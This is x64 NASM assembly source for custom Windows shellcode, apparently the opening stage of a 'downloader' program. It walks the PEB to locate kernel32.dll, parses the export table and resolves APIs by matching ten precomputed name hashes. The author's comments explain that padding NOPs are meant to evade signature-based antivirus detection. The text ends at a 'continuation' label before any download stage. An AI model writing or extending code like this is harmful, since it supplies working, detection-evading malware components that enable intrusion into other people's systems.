;nasm -fwin64 [x64findkernel32.asm]
;x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe

BITS 64

SECTION .data
SECTION .bss

;**********************************************************************
; This first part is just the standard prologue that all shellcode uses
; to walk the PEB and locate our API function addresses in memory
;**********************************************************************

section .text
global main
main:
                         ; metasploit shellcode normally starts with the same hex values.  using nops to start will help ours stand out less :)
                         ; plus this will be custom made shellcode so that helps too :)
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
nop                      ;throw off rudimentary signature detection based on shellcode patterns
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]      ;kernel32.dll base address
mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov r13, r11                  ; Save for later
mov rcx, r10                  ; Set loop counter

;**********************************************************************
; In short, this second part is where we start cycling through all the API functions
; Starting with Z and working our way to A
; While that's happening, we hash each API with our hashing routine we discussed earlier
; And compare the hashed value with our predetermined hash values and see if there's a match!
;**********************************************************************

kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    jmp hashinitiator
FunctionNameNotFound:
jmp continuation
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the API! w00t!
   push r15                       ; Push the API we found to the stack for retrieval later.  We do this for all of them
   mov r11, r13
   dec ecx
   jmp kernel32findfunction

   ;********************************************************
   ; This is our hashing routine where we check if our hash
   ; matches the hash of the current API function
   ;********************************************************

   hashinitiator:
       xor eax, eax
       mov rsi, rbx
       xor rbx, rbx
   next_char:
       mov bl, [rsi]       ; load next char
       test bl, bl
       jz check_hash
       rol eax, 5          ; rotate hash left 5 bits
       xor eax, ebx        ; hash ^= char
       inc rsi
       jmp next_char

   ;********************************************************
   ; This is where we check the hash generated and stored in the EAX register
   ; with all of our pretermined hash values
   ; if there's a match that's found, we jump to FunctionNameFound
   ; and save the hash by pushing it to the stack
   ;********************************************************

   check_hash:
   cmp eax, 0x80778D35                ; Compare all bytes of eax with our pretermined hash values
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x4A155ACA                
   je FunctionNameFound               
   cmp eax, 0x85B79578
   je FunctionNameFound
   cmp eax, 0xB68D8A33
   je FunctionNameFound
   cmp eax, 0xC7DEFE95
   je FunctionNameFound
   cmp eax, 0xA4A1011B
   je FunctionNameFound
   cmp eax, 0xE536B693
   je FunctionNameFound
   cmp eax, 0xE3DB70A7
   je FunctionNameFound
   cmp eax, 0xCEFC5AFD
   je FunctionNameFound
   cmp eax, 0xD7277164
   je FunctionNameFound
   
   jmp kernel32findfunction
   
continuation:

   ;********************************************************
   ; CONGRATS!  you found all the hashes, let's continue
   ;******************************************************** 
